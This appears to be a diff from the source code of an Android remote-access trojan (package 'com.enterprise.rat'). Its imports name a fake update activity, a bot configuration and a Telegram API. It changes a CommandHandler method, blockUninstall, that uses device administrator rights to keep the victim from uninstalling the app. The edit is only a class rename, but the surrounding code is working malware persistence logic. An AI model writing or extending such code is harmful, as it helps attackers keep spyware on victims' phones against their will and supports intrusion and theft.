@@ -5,7 +5,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Environment;
-import com.enterprise.rat.admin.DeviceAdminReceiver;
+import com.enterprise.rat.admin.AdminReceiver;
 import com.enterprise.rat.activities.FakeUpdateActivity;
 import com.enterprise.rat.bot.BotConfig;
 import com.enterprise.rat.utils.TelegramApi;
@@ -258,7 +258,7 @@ public class CommandHandler {
     private void blockUninstall() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminComponent = new ComponentName(context, DeviceAdminReceiver.class);
+            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
 
             if (dpm.isAdminActive(adminComponent)) {
                 dpm.setUninstallBlocked(adminComponent, context.getPackageName(), true);
